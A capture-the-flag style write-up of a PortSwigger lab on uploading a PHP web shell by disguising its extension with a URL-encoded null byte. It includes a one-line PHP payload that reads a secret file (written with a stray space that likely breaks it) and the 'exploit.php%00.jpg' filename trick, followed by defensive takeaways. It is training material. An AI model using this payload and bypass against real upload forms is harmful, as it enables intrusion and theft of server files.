#  Web Shell Upload via Obfuscated File Extension

## 📌 Lab Details
- **Title**: Web Shell Upload via Obfuscated File Extension
- **Difficulty**: Practitioner
- **Category**: File Upload Vulnerabilities
- **Lab URL**: https://portswigger.net/academy/labs/launch/4ed109e9f6a1c61c6f344591bd7db083cd04f596804f6ba9670cbd6a3fdcafeb?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-web-shell-upload-via-obfuscated-file-extension

## 🔍 Summary
The application allows users to upload avatar images. Although dangerous file extensions like `.php` are blocked, the validation mechanism can be bypassed using a **URL-encoded null byte (`%00`)**.

## 🛠 Steps to Solve
1. Login and upload an image as your avatar.
2. Send the `GET` request `/files/avatars/<IMAGE>` to Burp Repeater.
3. Create an **exploit.php** file containing the script:
   ```sh
   <? php file_get_contents('/home/carlos/secret'); ?>
   ```
4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload JPG and PNG files.
5. In the `POST /my-account/avatar` request, under the `Content-Disposition` header, change the value of the `filename` parameter to `"exploit.php%00.jpg"`.
6. Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as `exploit.php`, suggesting that the null byte and `.jpg` extension have been stripped.
7. Send the `GET` request `/files/avatars/exploit.php` to find the secret.

## 📖 Key Takeaways
- Null byte injection can bypass weak extension validation.
- File upload restrictions should never rely solely on filename checks.
- Backend systems may process filenames differently than validation logic.
- Store uploaded files outside the web root whenever possible.

## 🖼️ Screenshot
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cf148444-41c0-4b94-8f4a-661e15710a05" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a96c12e6-06b0-457c-af8d-7adaf4ea26e1" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/30c67ef2-daac-4ed4-b5f9-745a11dd4993" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8689990f-2f7c-4686-ba56-40ae99c696a3" />
